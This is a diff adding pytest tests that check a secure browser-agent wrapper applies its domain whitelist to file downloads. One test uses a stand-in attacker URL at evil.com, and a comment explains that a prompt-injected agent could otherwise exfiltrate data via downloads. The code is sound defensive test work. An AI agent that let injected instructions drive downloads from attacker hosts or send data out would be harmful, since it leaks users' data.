@@ -129,6 +129,35 @@ class TestNavigateGate:
         inner.tab_new.assert_awaited_once_with(None)
 
     @pytest.mark.asyncio
+    async def test_download_url_uses_same_layer_1_check(self) -> None:
+        # ``download url`` fetches server-side like ``fetch``; a configured
+        # domain policy must gate it too, otherwise an injected agent could
+        # exfiltrate via download instead of fetch.
+        inner = MagicMock()
+        inner.download_url = AsyncMock()
+        cfg = _make_config(whitelist=["files.example.com"])
+        secure = SecureBrowserContext(inner, cfg)
+
+        with pytest.raises(SecurityError):
+            await secure.download_url("https://evil.com/x.zip", output_dir="/tmp")
+        inner.download_url.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_download_url_allowed_domain_passes_through(self) -> None:
+        inner = MagicMock()
+        inner.download_url = AsyncMock(return_value={"path": "/tmp/x.zip"})
+        cfg = _make_config(whitelist=["files.example.com"])
+        secure = SecureBrowserContext(inner, cfg)
+
+        result = await secure.download_url(
+            "https://files.example.com/x.zip", output_dir="/tmp"
+        )
+        assert result["path"] == "/tmp/x.zip"
+        inner.download_url.assert_awaited_once_with(
+            "https://files.example.com/x.zip", output_dir="/tmp"
+        )
+
+    @pytest.mark.asyncio
     async def test_security_block_flips_inner_page_valid(self) -> None:
         """PRD 05-19: ``file://`` rejected by Layer 1 must mark page invalid.
 
